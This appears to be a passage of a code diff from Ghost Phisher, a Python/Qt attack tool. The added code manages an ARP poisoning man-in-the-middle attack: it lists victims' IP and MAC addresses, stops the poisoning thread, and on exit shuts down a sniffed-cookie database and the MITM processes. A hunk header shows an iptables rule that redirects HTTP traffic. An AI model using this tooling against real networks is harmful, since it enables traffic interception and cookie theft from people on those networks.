+                arp_number = arp_victim_count
+
+            time.sleep(1)
+
+
+
+    def display_arp_victim_info(self):
+        all_hosts = set(self.arp_attack.subnet_hosts.keys())
+        for victim in list(self.arp_victims.symmetric_difference(all_hosts)):
+            mac_address = self.arp_attack.subnet_hosts[victim]
+            self.arp_poison_browser.append("<font color=green><b>%s</b>%s<b>%s</b>"%(victim,'&nbsp;' * 8,mac_address))
+            self.arp_victims.add(victim)
+
+
+
+    def stop_arp_poison_attack(self):
+        self.arp_attack.control = False
+        self.arp_victims = set()
+        self.arp_attack._Thread__stop()
+        self.arp_attack = Fern_MITM_Class.ARP_Poisoning()
+        self.start_arp_poison.setEnabled(True)
+        self.stop_arp_poison.setEnabled(False)
+        self.interface_selection_control = True
+
+
 
 
     #######################################################
@@ -1908,6 +2631,14 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         global http_terminal
         answer = QtGui.QMessageBox.question(self,"Ghost Phisher","Are you sure you want to quit?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
         if answer == QtGui.QMessageBox.Yes:
+
+            if(self.stop_sniffing_button_3.isEnabled()):
+                typedef = type(self.cookie_db_jar).__name__
+                if(typedef == "Connection"):
+                    self.cookie_db_jar.close()                          # Close cookie database connection
+
+                self.kill_MITM_process()
+                self.cookie_core.terminate()                            # Kill QtCore.QThread
 
             if(os.environ.get("ghost_fake_http_control") == "start"):
                     self.stop_http()
